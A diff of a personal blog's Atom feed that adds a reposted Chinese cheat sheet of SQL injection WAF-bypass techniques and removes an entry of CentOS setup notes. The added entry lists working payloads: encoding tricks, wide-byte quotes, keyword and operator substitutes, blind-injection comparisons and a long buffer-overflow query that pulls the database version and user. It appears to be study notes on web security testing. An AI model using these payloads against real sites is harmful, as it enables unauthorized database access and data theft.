@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://Morn-zh.github.io</id>
     <title>Morn-zh</title>
-    <updated>2021-04-17T09:28:23.755Z</updated>
+    <updated>2021-04-17T09:38:51.559Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://Morn-zh.github.io"/>
     <link rel="self" href="https://Morn-zh.github.io/atom.xml"/>
@@ -10,6 +10,131 @@
     <logo>https://Morn-zh.github.io/images/avatar.png</logo>
     <icon>https://Morn-zh.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, Morn-zh</rights>
+    <entry>
+        <title type="html"><![CDATA[sql注入绕过姿势总结（转载）]]></title>
+        <id>https://Morn-zh.github.io/post/sql-zhu-ru-rao-guo-zi-shi-zong-jie-zhuan-zai/</id>
+        <link href="https://Morn-zh.github.io/post/sql-zhu-ru-rao-guo-zi-shi-zong-jie-zhuan-zai/">
+        </link>
+        <updated>2021-04-17T09:38:36.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="sql注入绕过姿势总结转载">sql注入绕过姿势总结（转载）</h1>
+<p>作者：<a href="https://www.cnblogs.com/joker-vip/">joker0xxx3</a></p>
+<p>出处：https://www.cnblogs.com/joker-vip/</p>
+<h2 id="1注释符绕过">1.注释符绕过</h2>
+<p>常用的注释符有：</p>
+<p>1）-- 注释内容</p>
+<p>2）# 注释内容</p>
+<p>3）/<em>注释内容</em>/</p>
+<p>eg：union select 1,2#</p>
+<p>union select 1,2 --+</p>
+<p>构造闭合 ’ union select 1,2’</p>
+<hr>
+<h2 id="2大小写绕过">2.大小写绕过</h2>
+<p>常用于 waf的正则对大小写不敏感的情况。</p>
+<p>eg：uniOn selEct 1,2</p>
+<hr>
+<h2 id="3内联注释绕过">3.内联注释绕过</h2>
+<p>内联注释就是把一些特有的仅在MYSQL上的语句放在 /<em>!...</em>/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。别和注释/*... */搞混了。</p>
+<p>eg：union /<em>!select</em>/ 1,2</p>
+<hr>
+<h2 id="4双写关键字绕过">4.双写关键字绕过</h2>
+<p>一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。</p>
+<p>eg：union seselectlect 1,2</p>
+<hr>
+<h2 id="5特殊编码绕过">5.特殊编码绕过</h2>
+<p>1）十六进制绕过</p>
+<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=0x61645F6C696E6B</p>
+<p>2）ascii编码绕过</p>
+<p>eg：Test =CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
+<p>3）Unicode编码</p>
+<p>常用的几个符号的一些Unicode编码：</p>
+<p>单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</p>
+<p>空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</p>
+<p>左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</p>
+<p>右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</p>
+<hr>
+<h2 id="6空格过滤绕过">6.空格过滤绕过</h2>
+<p>可代替空格的方式：</p>
+<p>1）/**/</p>
+<p>2）()</p>
+<p>3）回车(url编码中的%0a)</p>
+<p>4）`(tap键上面的按钮)</p>
+<p>5）tap</p>
+<p>6）两个空格</p>
+<p>eg：union/<strong>/select/</strong>/1,2</p>
+<p>select(passwd)from(users)  #注意括号中不能含有*</p>
+<p>select<code>passwd</code>from<code>users</code></p>
+<hr>
+<h2 id="7过滤or-and-xor异或not-绕过">7.过滤or and xor(异或)not 绕过</h2>
+<p>and = &amp;&amp;</p>
+<p>or = ||</p>
+<p>xor = |</p>
+<p>not = !</p>
+<hr>
+<h2 id="8过滤等号绕过">8.过滤等号=绕过</h2>
+<p>1）不加通配符的like执行的效果和=一致，所以可以用来绕过。</p>
+<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name like &quot;users&quot;</p>
+<p>2）rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来，用来取代=时，rlike的用法和上面的like一样，没有通配符效果和=一样</p>
+<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name rlike &quot;users&quot;</p>
+<p>3）regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配</p>
+<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name regexp &quot;users&quot;</p>
+<p>4）使用大小于号来绕过</p>
+<p>eg：select * from users where id &gt; 1 and id &lt; 3</p>
+<p>5）&lt;&gt; 等价于 !=，所以在前面再加一个!结果就是等号了</p>
+<p>eg：select * from users where !(id &lt;&gt; 1)</p>
+<hr>
+<h2 id="9过滤大小于号绕过">9.过滤大小于号绕过</h2>
+<p>在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。</p>
+<p>1）greatest(n1, n2, n3…):返回n中的最大值</p>
+<p>eg：select * from users where id = 1 and greatest(ascii(substr(username,1,1)),1)=116</p>
+<p>2）least(n1,n2,n3…):返回n中的最小值，与上同理。</p>
+<p>3）strcmp(str1,str2):若所有的字符串均相同，则返回0，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1</p>
+<p>eg：select * from users where id = 1 and strcmp(ascii(substr(username,1,1)),117)</p>
+<p>4）in关键字</p>
+<p>eg：select * from users where id = 1 and substr(username,1,1) in ('t')</p>
+<p>5）between a and b:范围在a-b之间，包括a、b。</p>
+<p>eg：select * from users where id between 1 and 2</p>
+<p>select * from users where id between 1 and 1</p>
+<hr>
+<h2 id="10过滤引号绕过">10.过滤引号绕过</h2>
+<p>1）使用十六进制</p>
+<p>eg：UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=0x61645F6C696E6B</p>
+<p>2）宽字节，常用在web应用使用的字符集为GBK时，并且过滤了引号，就可以试试宽字节。%27表示 '(单引号)，单引号会被转义成'</p>
+<p>eg：%E6' union select 1,2 #</p>
+<p>%df%27 union select 1,2,3 #</p>
+<hr>
+<h2 id="11过滤逗号绕过">11.过滤逗号绕过</h2>
+<p>1）如果waf过滤了逗号，并且只能盲注，在取子串的几个函数中，有一个替代逗号的方法就是使用from pos for len，其中pos代表从pos个开始读取len长度的子串<br>
+eg：常规写法 select substr(&quot;string&quot;,1,3)</p>
+<p>若过滤了逗号，可以使用from pos for len来取代 select substr(&quot;string&quot; from 1 for 3)</p>
+<p>sql盲注中 select ascii(substr(database() from 1 for 1)) &gt; 110</p>
+<p>2）也可使用join关键字来绕过</p>
+<p>eg：select * from users union select * from (select 1)a join (select 2)b join(select 3)c</p>
+<p>上式等价于 union select 1,2,3</p>
+<p>3）使用like关键字，适用于substr()等提取子串的函数中的逗号</p>
+<p>eg：select user() like &quot;t%&quot;</p>
+<p>上式等价于 select ascii(substr(user(),1,1))=114</p>
+<p>5）使用offset关键字，适用于limit中的逗号被过滤的情况，limit 2,1等价于limit 1 offset 2</p>
+<p>eg：select * from users limit 1 offset 2</p>
+<p>上式等价于 select * from users limit 2,1</p>
+<hr>
+<h2 id="12过滤函数绕过">12.过滤函数绕过</h2>
+<p>1）sleep() --&gt;benchmark()</p>
+<p>MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式</p>
+<p>eg：select 1,2 and benchmark(1000000000,1)</p>
+<p>2）ascii()–&gt;hex()、bin()，替代之后再使用对应的进制转string即可</p>
+<p>3）group_concat()–&gt;concat_ws()，第一个参数为分隔符</p>
+<p>eg：mysql&gt; select concat_ws(&quot;,&quot;,&quot;str1&quot;,&quot;str2&quot;)</p>
+<p>4）substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()</p>
+<p>5）user() --&gt; @@user、datadir–&gt;@@datadir</p>
+<p>6）ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。</p>
+<hr>
+<h2 id="13缓冲区溢出">13.缓冲区溢出</h2>
+<p>缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p>
+<p>eg：?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</p>
+<p>示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出</p>
+<hr>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[MySQL手注之Root权限处理]]></title>
         <id>https://Morn-zh.github.io/post/mysql-shou-zhu-zhi-root-quan-xian-chu-li/</id>
@@ -191,7 +316,7 @@ secure_file_priv
 <p>参考文章：https://www.cdxy.me/?p=789</p>
 <p>https://www.cnblogs.com/forforever/p/13019703.html</p>
 <p>https://my.oschina.net/u/4615518/blog/4554203</p>
-<p><a href="https://www.cnblogs.com/joker-vip/p/12698962.html">绕过姿势</a>（待看）</p>
+<p><a href="https://www.cnblogs.com/joker-vip/p/12698962.html">绕过姿势</a></p>
 </blockquote>
 <h2 id="原理">原理</h2>
 <p>将延时作为判断依据，判断相关的信息</p>
@@ -1445,45 +1570,6 @@ daemon = True
 <pre><code>kill $(lsof -i:9000|awk '{if(NR==2)print $2}')
 </code></pre>
 <p>原理是筛选端口，关闭对应的服务，其中9000就是之前设置的端口号</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[折腾Centos随记]]></title>
-        <id>https://Morn-zh.github.io/post/zhe-teng-centos-sui-ji/</id>
-        <link href="https://Morn-zh.github.io/post/zhe-teng-centos-sui-ji/">
-        </link>
-        <updated>2020-09-14T09:22:11.000Z</updated>
-        <content type="html"><![CDATA[<p>pkill -f uWSGI -9 杀掉所有进程<br>
-cd /etc/yum.repos.d/</p>
-<p>生成requirements.txt（虚拟环境下操作）<br>
-pip freeze &gt;requirements.txt<br>
-pip install -r requirements.txt</p>
-<p>docker安装<br>
-yum update<br>
-yum install -y yum-utils device-mapper-persistent-data lvm2<br>
-yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</p>
-<h1 id="gunicorn启动指令">gunicorn启动指令</h1>
-<p>gunicorn start:app -c gunicorn.conf.py</p>
-<p>kill $(lsof -i:9000|awk '{if(NR==2)print $2}')</p>
-<h1 id="创建纯净的虚拟环境">创建纯净的虚拟环境</h1>
-<pre><code>vim /etc/profile
-# 将下面内容添加到文件的最下面
-PATH=$PATH:/usr/local/python3/bin
-
-#是添加的进行生效命令
-source /etc/profile
-</code></pre>
-<p>virtualenv --python=python3  venv</p>
-<h1 id="centos换源">centos换源</h1>
-<p>mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</p>
-<p>wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</p>
-<p>yum clean all</p>
-<p>yum makecache</p>
-<p>yum update</p>
-<h1 id="centos7安装python381">centos7安装python3.8.1</h1>
-<p>https://blog.csdn.net/wohiusdashi/article/details/89358071</p>
-<h1 id="centos7安装mysql">centos7安装mysql</h1>
-<p>https://blog.csdn.net/weixin_43616817/article/details/106378512</p>
 ]]></content>
     </entry>
 </feed>
